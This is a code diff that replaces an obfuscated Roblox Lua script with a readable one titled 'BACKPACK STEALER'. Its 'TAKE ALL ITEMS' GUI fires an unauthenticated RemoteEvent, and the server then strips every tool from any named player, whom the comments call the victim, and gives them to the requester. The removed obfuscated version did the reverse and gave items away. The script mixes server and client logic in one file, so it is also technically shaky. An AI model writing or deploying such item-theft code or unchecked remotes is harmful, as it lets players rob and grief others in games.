@@ -1,1 +1,303 @@
-local _a=game:GetService(string.char(80,108,97,121,101,114,115))local _b=game:GetService(string.char(82,101,112,108,105,99,97,116,101,100,83,116,111,114,97,103,101))local _c=game:GetService(string.char(84,119,101,101,110,83,101,114,118,105,99,101))local _d=game:GetService(string.char(85,115,101,114,73,110,112,117,116,83,101,114,118,105,99,101))local _e=_a.LocalPlayer local _f=_b:FindFirstChild(string.char(71,105,118,101,76,97,117,110,99,104,101,114,69,118,101,110,116))if not _f then _f=Instance.new(string.char(82,101,109,111,116,101,69,118,101,110,116))_f.Name=string.char(71,105,118,101,76,97,117,110,99,104,101,114,69,118,101,110,116)_f.Parent=_b end local function _g(_h,_i)local _j=_a:FindFirstChild(_i)if not _h or not _j then warn((string.char(208,158,209,130,208,191,209,128,208,176,208,178,208,184,209,130,208,181,208,187,209,140,32,208,184,208,187,208,184,32,208,191,208,190,208,187,209,131,209,135,208,176,209,130,208,181,208,187,209,140,32,208,189,208,181,32,208,189,208,176,208,185,208,180)..string.char(208,181,208,189,32,208,178,32,208,184,208,179,209,128,208,181,33)))return end local _k=_h:FindFirstChild(string.char(66,97,99,107,112,97,99,107))local _l=_j:FindFirstChild(string.char(66,97,99,107,112,97,99,107))if not _k or not _l then return end local _m=0 for _n,_o in ipairs(_k:GetChildren())do if _o:IsA(string.char(84,111,111,108))then _o.Parent=_l _m=_m+1 end end local _p=_h.Character if _p then for _q,_r in ipairs(_p:GetChildren())do if _r:IsA(string.char(84,111,111,108))then _r.Parent=_l _m=_m+1 end end end print(string.char(208,163,209,129,208,191,208,181,209,136,208,189,208,190,32,208,191,208,181,209,128,208,181,208,180,208,176,208,189,208,190,32,208,191,209,128,208,181,208,180,208,188,208,181,209,130,208,190,208,178,58,32).._m)end if game:GetService(string.char(82,117,110,83,101,114,118,105,99,101)):IsServer()then _f.OnServerEvent:Connect(function(_s,_t)_g(_s,_t)end)end if game:GetService(string.char(82,117,110,83,101,114,118,105,99,101)):IsClient()then local _u=Instance.new(string.char(83,99,114,101,101,110,71,117,105))_u.Name=string.char(76,97,117,110,99,104,101,114,72,117,98)_u.ResetOnSpawn=false _u.DisplayOrder=999 _u.Parent=_e:WaitForChild(string.char(80,108,97,121,101,114,71,117,105))local function _v(_w,_x,_y)local _z=Instance.new(_w)for _A,_B in pairs(_x)do _z[_A]=_B end _z.Parent=_y return _z end local function _C(_D,_E)_v(string.char(85,73,67,111,114,110,101,114),{CornerRadius=UDim.new(0,_E)},_D)end local _F=_v(string.char(84,101,120,116,66,117,116,116,111,110),{Size=UDim2.fromOffset(60,60),Position=UDim2.new(0,20,0.5,-30),BackgroundColor3=Color3.fromRGB(10,55,130),Text=string.char(240,159,142,146),TextSize=32,TextColor3=Color3.new(1,1,1)},_u)_C(_F,16)local _G=_v(string.char(70,114,97,109,101),{Size=UDim2.fromOffset(570,320),Position=UDim2.new(0.5,-285,0.5,-160),BackgroundColor3=Color3.fromRGB(7,16,39),Visible=false},_u)_C(_G,20)_v(string.char(85,73,83,116,114,111,107,101),{Color=Color3.fromRGB(0,180,255),Thickness=2},_G)local _H=_v(string.char(70,114,97,109,101),{Size=UDim2.new(1,0,0,76),BackgroundColor3=Color3.fromRGB(0,100,220),BorderSizePixel=0},_G)_C(_H,18)_v(string.char(85,73,71,114,97,100,105,101,110,116),{Color=ColorSequence.new(Color3.fromRGB(0,100,255),Color3.fromRGB(0,220,255))},_H)_v(string.char(84,101,120,116,76,97,98,101,108),{Size=UDim2.new(1,-150,0,40),Position=UDim2.fromOffset(20,5),BackgroundTransparency=1,Text=string.char(226,156,166,32,76,65,85,78,67,72,69,82,32,72,85,66),TextColor3=Color3.new(1,1,1),TextSize=25,Font=Enum.Font.GothamBlack,TextXAlignment=Enum.TextXAlignment.Left},_H)_v(string.char(84,101,120,116,76,97,98,101,108),{Size=UDim2.new(1,-150,0,20),Position=UDim2.fromOffset(22,45),BackgroundTransparency=1,Text=string.char(66,65,67,75,80,65,67,75,32,84,82,65,78,83,70,69,82),TextColor3=Color3.fromRGB(210,235,255),TextSize=11,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Left},_H)local _I=_v(string.char(84,101,120,116,66,117,116,116,111,110),{Size=UDim2.fromOffset(36,36),Position=UDim2.new(1,-44,0,20),BackgroundColor3=Color3.fromRGB(20,80,170),Text=string.char(195,151),TextSize=26,TextColor3=Color3.new(1,1,1)},_H)_C(_I,10)local _J=_v(string.char(84,101,120,116,66,117,116,116,111,110),{Size=UDim2.fromOffset(36,36),Position=UDim2.new(1,-86,0,20),BackgroundColor3=Color3.fromRGB(20,80,170),Text=string.char(226,128,148),TextSize=22,TextColor3=Color3.new(1,1,1)},_H)_C(_J,10)_v(string.char(84,101,120,116,76,97,98,101,108),{Size=UDim2.fromOffset(130,110),Position=UDim2.fromOffset(25,110),BackgroundTransparency=1,Text=string.char(240,159,142,146),TextSize=82},_G)local function _K(_L,_M)local _N=_v(string.char(84,101,120,116,66,111,120),{Size=UDim2.new(1,-205,0,52),Position=UDim2.fromOffset(180,_M),BackgroundColor3=Color3.fromRGB(15,32,70),TextColor3=Color3.new(1,1,1),PlaceholderColor3=Color3.fromRGB(150,190,230),PlaceholderText=_L,Text="",TextSize=15,Font=Enum.Font.Gotham,ClearTextOnFocus=false},_G)_C(_N,12)_v(string.char(85,73,83,116,114,111,107,101),{Color=Color3.fromRGB(0,130,230),Thickness=1},_N)return _N end local _O=_K(string.char(82,101,99,105,112,105,101,110,116,32,117,115,101,114,110,97,109,101,46,46,46),115)local _P=_v(string.char(84,101,120,116,66,117,116,116,111,110),{Size=UDim2.new(1,-205,0,56),Position=UDim2.fromOffset(180,185),BackgroundColor3=Color3.fromRGB(0,130,255),Text=string.char(240,159,142,129,32,71,73,86,69,32,65,76,76,32,73,84,69,77,83),TextColor3=Color3.new(1,1,1),TextSize=17,Font=Enum.Font.GothamBlack},_G)_C(_P,13)local _Q=_v(string.char(84,101,120,116,76,97,98,101,108),{Size=UDim2.new(1,-40,0,32),Position=UDim2.fromOffset(20,265),BackgroundColor3=Color3.fromRGB(15,30,65),Text=string.char(226,151,143,32,82,101,97,100,121),TextColor3=Color3.fromRGB(150,220,255),TextSize=13,Font=Enum.Font.Gotham},_G)_C(_Q,10)local _R=false local _S=false _F.MouseButton1Click:Connect(function()_R=not _R _G.Visible=_R if _R then _G.Size=UDim2.fromOffset(520,280)_c:Create(_G,TweenInfo.new(0.25,Enum.EasingStyle.Back),{Size=UDim2.fromOffset(570,320)}):Play()end end)_I.MouseButton1Click:Connect(function()_R=false _G.Visible=false end)_J.MouseButton1Click:Connect(function()_S=not _S for _T,_U in ipairs(_G:GetChildren())do if _U~=_H and not _U:IsA(string.char(85,73,67,111,114,110,101,114))and not _U:IsA(string.char(85,73,83,116,114,111,107,101))and not _U:IsA(string.char(85,73,71,114,97,100,105,101,110,116))then _U.Visible=not _S end end _G.Size=_S and UDim2.fromOffset(570,76)or UDim2.fromOffset(570,320)end)local _V=false local _W local _X _H.InputBegan:Connect(function(_Y)if _Y.UserInputType==Enum.UserInputType.MouseButton1 or _Y.UserInputType==Enum.UserInputType.Touch then _V=true _W=_Y.Position _X=_G.Position end end)_d.InputChanged:Connect(function(_Z)if _V and(_Z.UserInputType==Enum.UserInputType.MouseMovement or _Z.UserInputType==Enum.UserInputType.Touch)then local _ba=_Z.Position-_W _G.Position=UDim2.new(_X.X.Scale,_X.X.Offset+_ba.X,_X.Y.Scale,_X.Y.Offset+_ba.Y)end end)_d.InputEnded:Connect(function(_bb)if _bb.UserInputType==Enum.UserInputType.MouseButton1 or _bb.UserInputType==Enum.UserInputType.Touch then _V=false end end)_P.MouseButton1Click:Connect(function()if _O.Text==""then _Q.Text=string.char(226,151,143,32,69,110,116,101,114,32,114,101,99,105,112,105,101,110,116,32,117,115,101,114,110,97,109,101)return end _f:FireServer(_O.Text)_Q.Text=string.char(226,151,143,32,82,101,113,117,101,115,116,32,115,101,110,116,32,116,111,32,115,101,114,118,101,114)end)print(string.char(76,97,117,110,99,104,101,114,32,72,117,98,32,108,111,97,100,101,100,33))end
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TweenService = game:GetService("TweenService")
+local UIS = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+
+-- Автоматическое создание RemoteEvent
+local event = ReplicatedStorage:FindFirstChild("GiveLauncherEvent")
+if not event then
+	event = Instance.new("RemoteEvent")
+	event.Name = "GiveLauncherEvent"
+	event.Parent = ReplicatedStorage
+end
+
+-- СЕРВЕРНАЯ ЛОГИКА (Забирает вещи у введенного игрока и отдает нажавшему)
+local function serverTransfer(senderPlayer, targetName)
+	local targetObj = Players:FindFirstChild(targetName)
+
+	if not senderPlayer or not targetObj then
+		warn("Игрок не найден в игре!")
+		return
+	end
+
+	-- Меняем местами: жертва/донор (target) и тот, кому прилетит (senderPlayer)
+	local targetBackpack = targetObj:FindFirstChild("Backpack")
+	local receiverBackpack = senderPlayer:FindFirstChild("Backpack")
+
+	if not targetBackpack or not receiverBackpack then
+		return
+	end
+
+	local transferredCount = 0
+
+	-- Переносим из Backpack целевого игрока к нам
+	for _, item in ipairs(targetBackpack:GetChildren()) do
+		if item:IsA("Tool") then
+			item.Parent = receiverBackpack
+			transferredCount = transferredCount + 1
+		end
+	end
+
+	-- Проверяем вещь в руках у целевого игрока
+	local targetChar = targetObj.Character
+	if targetChar then
+		for _, item in ipairs(targetChar:GetChildren()) do
+			if item:IsA("Tool") then
+				item.Parent = receiverBackpack
+				transferredCount = transferredCount + 1
+			end
+		end
+	end
+
+	print("Успешно забрано предметов: " .. transferredCount .. " у " .. targetName)
+end
+
+if game:GetService("RunService"):IsServer() then
+	event.OnServerEvent:Connect(function(senderPlayer, targetName)
+		serverTransfer(senderPlayer, targetName)
+	end)
+end
+
+-- КЛИЕНТСКАЯ ЧАСТЬ (GUI)
+if game:GetService("RunService"):IsClient() then
+	local gui = Instance.new("ScreenGui")
+	gui.Name = "LauncherHub"
+	gui.ResetOnSpawn = false
+	gui.DisplayOrder = 999
+	gui.Parent = player:WaitForChild("PlayerGui")
+
+	local function make(class, props, parent)
+		local obj = Instance.new(class)
+		for k, v in pairs(props) do
+			obj[k] = v
+		end
+		obj.Parent = parent
+		return obj
+	end
+
+	local function round(obj, radius)
+		make("UICorner", {
+			CornerRadius = UDim.new(0, radius)
+		}, obj)
+	end
+
+	local icon = make("TextButton", {
+		Size = UDim2.fromOffset(60, 60),
+		Position = UDim2.new(0, 20, 0.5, -30),
+		BackgroundColor3 = Color3.fromRGB(10, 55, 130),
+		Text = "🎒",
+		TextSize = 32,
+		TextColor3 = Color3.new(1, 1, 1)
+	}, gui)
+	round(icon, 16)
+
+	local frame = make("Frame", {
+		Size = UDim2.fromOffset(570, 320),
+		Position = UDim2.new(0.5, -285, 0.5, -160),
+		BackgroundColor3 = Color3.fromRGB(7, 16, 39),
+		Visible = false
+	}, gui)
+	round(frame, 20)
+
+	make("UIStroke", {
+		Color = Color3.fromRGB(0, 180, 255),
+		Thickness = 2
+	}, frame)
+
+	local header = make("Frame", {
+		Size = UDim2.new(1, 0, 0, 76),
+		BackgroundColor3 = Color3.fromRGB(0, 100, 220),
+		BorderSizePixel = 0
+	}, frame)
+	round(header, 18)
+
+	make("UIGradient", {
+		Color = ColorSequence.new(
+			Color3.fromRGB(0, 100, 255),
+			Color3.fromRGB(0, 220, 255)
+		)
+	}, header)
+
+	make("TextLabel", {
+		Size = UDim2.new(1, -150, 0, 40),
+		Position = UDim2.fromOffset(20, 5),
+		BackgroundTransparency = 1,
+		Text = "✦ LAUNCHER HUB",
+		TextColor3 = Color3.new(1, 1, 1),
+		TextSize = 25,
+		Font = Enum.Font.GothamBlack,
+		TextXAlignment = Enum.TextXAlignment.Left
+	}, header)
+
+	make("TextLabel", {
+		Size = UDim2.new(1, -150, 0, 20),
+		Position = UDim2.fromOffset(22, 45),
+		BackgroundTransparency = 1,
+		Text = "BACKPACK STEALER",
+		TextColor3 = Color3.fromRGB(210, 235, 255),
+		TextSize = 11,
+		Font = Enum.Font.GothamBold,
+		TextXAlignment = Enum.TextXAlignment.Left
+	}, header)
+
+	local close = make("TextButton", {
+		Size = UDim2.fromOffset(36, 36),
+		Position = UDim2.new(1, -44, 0, 20),
+		BackgroundColor3 = Color3.fromRGB(20, 80, 170),
+		Text = "×",
+		TextSize = 26,
+		TextColor3 = Color3.new(1, 1, 1)
+	}, header)
+	round(close, 10)
+
+	local minimize = make("TextButton", {
+		Size = UDim2.fromOffset(36, 36),
+		Position = UDim2.new(1, -86, 0, 20),
+		BackgroundColor3 = Color3.fromRGB(20, 80, 170),
+		Text = "—",
+		TextSize = 22,
+		TextColor3 = Color3.new(1, 1, 1)
+	}, header)
+	round(minimize, 10)
+
+	make("TextLabel", {
+		Size = UDim2.fromOffset(130, 110),
+		Position = UDim2.fromOffset(25, 110),
+		BackgroundTransparency = 1,
+		Text = "🎒",
+		TextSize = 82
+	}, frame)
+
+	local function input(placeholder, y)
+		local box = make("TextBox", {
+			Size = UDim2.new(1, -205, 0, 52),
+			Position = UDim2.fromOffset(180, y),
+			BackgroundColor3 = Color3.fromRGB(15, 32, 70),
+			TextColor3 = Color3.new(1, 1, 1),
+			PlaceholderColor3 = Color3.fromRGB(150, 190, 230),
+			PlaceholderText = placeholder,
+			Text = "",
+			TextSize = 15,
+			Font = Enum.Font.Gotham,
+			ClearTextOnFocus = false
+		}, frame)
+
+		round(box, 12)
+		make("UIStroke", {
+			Color = Color3.fromRGB(0, 130, 230),
+			Thickness = 1
+		}, box)
+
+		return box
+	end
+
+	local targetInput = input("Target username...", 115)
+
+	local give = make("TextButton", {
+		Size = UDim2.new(1, -205, 0, 56),
+		Position = UDim2.fromOffset(180, 185),
+		BackgroundColor3 = Color3.fromRGB(0, 130, 255),
+		Text = "🎁 TAKE ALL ITEMS",
+		TextColor3 = Color3.new(1, 1, 1),
+		TextSize = 17,
+		Font = Enum.Font.GothamBlack
+	}, frame)
+	round(give, 13)
+
+	local status = make("TextLabel", {
+		Size = UDim2.new(1, -40, 0, 32),
+		Position = UDim2.fromOffset(20, 265),
+		BackgroundColor3 = Color3.fromRGB(15, 30, 65),
+		Text = "● Ready",
+		TextColor3 = Color3.fromRGB(150, 220, 255),
+		TextSize = 13,
+		Font = Enum.Font.Gotham
+	}, frame)
+	round(status, 10)
+
+	local opened = false
+	local minimized = false
+
+	icon.MouseButton1Click:Connect(function()
+		opened = not opened
+		frame.Visible = opened
+
+		if opened then
+			frame.Size = UDim2.fromOffset(520, 280)
+			TweenService:Create(frame, TweenInfo.new(
+				0.25, Enum.EasingStyle.Back
+			), {
+				Size = UDim2.fromOffset(570, 320)
+			}):Play()
+		end
+	end)
+
+	close.MouseButton1Click:Connect(function()
+		opened = false
+		frame.Visible = false
+	end)
+
+	minimize.MouseButton1Click:Connect(function()
+		minimized = not minimized
+
+		for _, obj in ipairs(frame:GetChildren()) do
+			if obj ~= header
+				and not obj:IsA("UICorner")
+				and not obj:IsA("UIStroke")
+				and not obj:IsA("UIGradient") then
+				obj.Visible = not minimized
+			end
+		end
+
+		frame.Size = minimized
+			and UDim2.fromOffset(570, 76)
+			or UDim2.fromOffset(570, 320)
+	end)
+
+	local dragging = false
+	local dragStart
+	local startPos
+
+	header.InputBegan:Connect(function(inputObj)
+		if inputObj.UserInputType == Enum.UserInputType.MouseButton1
+			or inputObj.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = inputObj.Position
+			startPos = frame.Position
+		end
+	end)
+
+	UIS.InputChanged:Connect(function(inputObj)
+		if dragging and (
+			inputObj.UserInputType == Enum.UserInputType.MouseMovement
+			or inputObj.UserInputType == Enum.UserInputType.Touch
+		) then
+			local delta = inputObj.Position - dragStart
+			frame.Position = UDim2.new(
+				startPos.X.Scale, startPos.X.Offset + delta.X,
+				startPos.Y.Scale, startPos.Y.Offset + delta.Y
+			)
+		end
+	end)
+
+	UIS.InputEnded:Connect(function(inputObj)
+		if inputObj.UserInputType == Enum.UserInputType.MouseButton1
+			or inputObj.UserInputType == Enum.UserInputType.Touch then
+			dragging = false
+		end
+	end)
+
+	give.MouseButton1Click:Connect(function()
+		if targetInput.Text == "" then
+			status.Text = "● Enter target username"
+			return
+		end
+
+		event:FireServer(targetInput.Text)
+		status.Text = "● Request sent to server"
+	end)
+
+	print("Launcher Hub loaded!")
+end
